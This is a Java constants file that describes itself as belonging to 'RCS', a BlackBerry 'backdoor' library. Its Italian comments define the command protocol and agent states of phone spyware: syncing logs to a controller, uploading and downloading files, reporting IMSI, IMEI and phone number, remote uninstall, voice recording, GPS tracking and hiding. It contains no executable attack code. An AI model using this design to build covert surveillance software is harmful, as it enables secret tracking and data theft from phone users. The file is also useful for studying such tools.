/* *************************************************
 * Copyright (c) 2010 - 2010 HT srl, All rights reserved. Project : RCS,
 * RCSBlackBerry_lib File : Common.java Created : 26-mar-2010
 * ************************************************
 */
package com.ht.rcs.blackberry;

// TODO: Auto-generated Javadoc
// DWORD: uint 32bit

/**
 * The Class Common.
 */
public class Common {

    // public static final boolean AGENT_STOPPED = null;

    /** Lunghezza della chiave di cifratura utilizzata. */
    public static final int KEY_LEN = 128;

    /** Numero massimo di caratteri che grabbiamo dal titolo di una finestra. */
    public static final int MAX_TITLE_LEN = 512;

    /** Define per il recording della voce. */
    public static final int CHANNEL_INPUT = 1;

    /** Define comuni. */
    public static final long BACKDOOR_VERSION = 2010011901;

    /** The Constant PI. */
    public static final double PI = 3.141592653589793;

    /** The Constant MAX_ALLOCABLE_MEMORY. */
    public static final int MAX_ALLOCABLE_MEMORY = 1024 * 1024; // 1 Mb (il
    // define
    // dovrebbe
    // essere
    // multiplo di
    // 16)
    /** The Constant LOG_DELIMITER. */
    public static final int LOG_DELIMITER = 0xABADC0DE;

    /** The Constant FLASH. */
    public static final int FLASH = 0; // Flash Memory

    /** The Constant MMC1. */
    public static final int MMC1 = 1; // First MMC

    /** The Constant MMC2. */
    public static final int MMC2 = 2; // Second MMC

    /** Define per la sezione di upload/download dei file. */
    public static final int DOWNLOAD_CHUNK_SIZE = 50 * 1024;

    /**
     * Stato dell'agente
     */
    public static final int AGENT_OK = 0x0;

    /** The Constant AGENT_DISABLED. */
    public static final int AGENT_DISABLED = 0x1;

    /** The Constant AGENT_ENABLED. */
    public static final int AGENT_ENABLED = 0x2;

    /** The Constant AGENT_RUNNING. */
    public static final int AGENT_RUNNING = 0x3;

    /** The Constant AGENT_STOPPED. */
    public static final int AGENT_STOPPED = 0x4;

    /** Stato dei monitor. */
    public static final int EVENT_STOPPED = AGENT_STOPPED;

    /** The Constant EVENT_RUNNING. */
    public static final int EVENT_RUNNING = AGENT_RUNNING;

    /** Comandi per i monitor. */
    public static final int EVENT_STOP = EVENT_STOPPED;

    /** Comandi per l'agente. */
    public static final int AGENT_STOP = AGENT_STOPPED;

    /** The Constant AGENT_RELOAD. */
    public static final int AGENT_RELOAD = 0x1;

    /** Comandi generici. */
    public static final int NO_COMMAND = 0;

    /** Definizioni utilizzate dagli agenti nella scrittura dei log. */
    public static final int GPS_VERSION = 2008121901;

    /** The Constant CELL_VERSION. */
    public static final int CELL_VERSION = 2008121901;

    /** The Constant TYPE_GPS. */
    public static final int TYPE_GPS = 0x1;

    /** The Constant TYPE_CELL. */
    public static final int TYPE_CELL = 0x2;

    /** Parametri del protocollo (i comandi validi iniziano da 1 in poi). */
    public static final int INVALID_COMMAND = 0x0; // Non usare

    /** The Constant PROTO_OK. */
    public static final int PROTO_OK = 0x1; // OK

    /** The Constant PROTO_NO. */
    public static final int PROTO_NO = 0x2; // Comando fallito o non e' stato
    // possibile eseguirlo
    /** The Constant PROTO_BYE. */
    public static final int PROTO_BYE = 0x3; // Chiusura di connessione

    /** The Constant PROTO_CHALLENGE. */
    public static final int PROTO_CHALLENGE = 0x4; // CHALLENGE,16 byte da
    // cifrare
    /** The Constant PROTO_RESPONSE. */
    public static final int PROTO_RESPONSE = 0x5; // RESPONSE,16 byte cifrati

    /** The Constant PROTO_SYNC. */
    public static final int PROTO_SYNC = 0x6; // Mandami i log

    /** The Constant PROTO_NEW_CONF. */
    public static final int PROTO_NEW_CONF = 0x7; // NEW_CONF,# prendi la nuova
    // conf lunga # bytes
    /** The Constant PROTO_LOG_NUM. */
    public static final int PROTO_LOG_NUM = 0x8; // LOG_NUM,# stanno per
    // arrivare # logs
    /** The Constant PROTO_LOG. */
    public static final int PROTO_LOG = 0x9; // LOG,# questo log e' lungo #
    // bytes
    /** The Constant PROTO_UNINSTALL. */
    public static final int PROTO_UNINSTALL = 0xa; // Uninstallati

    /** The Constant PROTO_RESUME. */
    public static final int PROTO_RESUME = 0xb; // RESUME,nome,# rimandami il
    // log "nome" a partire dal byte

    /** The Constant PROTO_DOWNLOAD. */
    public static final int PROTO_DOWNLOAD = 0xc; // DOWNLOAD,nome: mandami il
    // file "nome" (in WCHAR, NULL
    // terminato)
    /** The Constant PROTO_UPLOAD. */
    public static final int PROTO_UPLOAD = 0xd; // UPLOAD,nome,directory,#: uppa
    // il file "nome" lungo # in
    // "directory"
    /** The Constant PROTO_FILE. */
    public static final int PROTO_FILE = 0xe; // #, Sta per arrivare un file
    // lungo # bytes
    /** The Constant PROTO_ID. */
    public static final int PROTO_ID = 0xf; // Id univoco della backdoor,
    // embeddato in fase di
    // configurazione
    /** The Constant PROTO_INSTANCE. */
    public static final int PROTO_INSTANCE = 0x10; // Id univoco che identifica
    // il dispositivo dove gira
    // la backdoor
    /** The Constant PROTO_USERID. */
    public static final int PROTO_USERID = 0x11; // IMSI,# byte NON paddati del
    // blocco (il blocco inviato e'
    // paddato)
    /** The Constant PROTO_DEVICEID. */
    public static final int PROTO_DEVICEID = 0x12; // IMEI,# byte NON paddati
    // del blocco (il blocco
    // inviato e' paddato)
    /** The Constant PROTO_SOURCEID. */
    public static final int PROTO_SOURCEID = 0x13; // #telefono,# byte NON
    // paddati del blocco (il
    // blocco inviato e' paddato)
    /** The Constant PROTO_VERSION. */
    public static final int PROTO_VERSION = 0x14; // #,bytes versione della
    // backdoor (10 byte)
    /** The Constant PROTO_LOG_END. */
    public static final int PROTO_LOG_END = 0x15; // La spedizione dei log e'
    // terminata
    /** The Constant PROTO_UPGRADE. */
    public static final int PROTO_UPGRADE = 0x16; // Tag per l'aggiornamento del
    // core
    /** The Constant PROTO_ENDFILE. */
    public static final int PROTO_ENDFILE = 0x17; // Tag che indica la
    // terminazione della fase di
    // download dei file
    /** The Constant PROTO_SUBTYPE. */
    public static final int PROTO_SUBTYPE = 0x18; // #,bytes che indicano la
    // subversion "WINMOBILE"

    /** /** Parametri di ritorno della Send(). */
    public static final int SEND_OK = 0x1;

    /** The Constant SEND_RELOAD. */
    public static final int SEND_RELOAD = 0x2;

    /** The Constant SEND_UNINSTALL. */
    public static final int SEND_UNINSTALL = 0x3;

    /** The Constant SEND_FAIL. */
    public static final int SEND_FAIL = 0x4;

    /** Parametri per la coda IPC. */
    public static final int IPC_PROCESS = 0x1;

    /** The Constant IPC_HIDE. */
    public static final int IPC_HIDE = 0x2;

    /** Define per la funzione di hash delle stringhe */
    public static final int FNV1_32_INIT = 0x811c9dc5;

    /** The Constant FNV1_32_PRIME. */
    public static final int FNV1_32_PRIME = 0x01000193;

}
